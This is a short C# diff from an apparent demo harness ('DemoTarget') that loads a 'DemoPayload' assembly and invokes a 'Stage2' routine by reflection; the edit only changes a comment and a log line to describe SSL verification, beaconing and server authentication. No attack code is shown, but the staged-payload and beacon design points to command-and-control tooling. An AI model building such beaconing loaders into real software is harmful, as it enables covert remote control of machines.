@@ -115,8 +115,8 @@ namespace DemoTarget
             }
             Console.WriteLine();
 
-            // ── Invoke Stage2.Execute(host, port) by reflection ──────────
-            Console.WriteLine("=== Invoking Stage2 (server connection + cert pinning) ===");
+            // ── Invoke Stage2.Execute(host, port, noSsl) by reflection ────
+            Console.WriteLine("=== Invoking Stage2 (SSL verify → beacon → server auth) ===");
             try
             {
                 Type stage2 = payload.GetType("DemoPayload.Stage2");
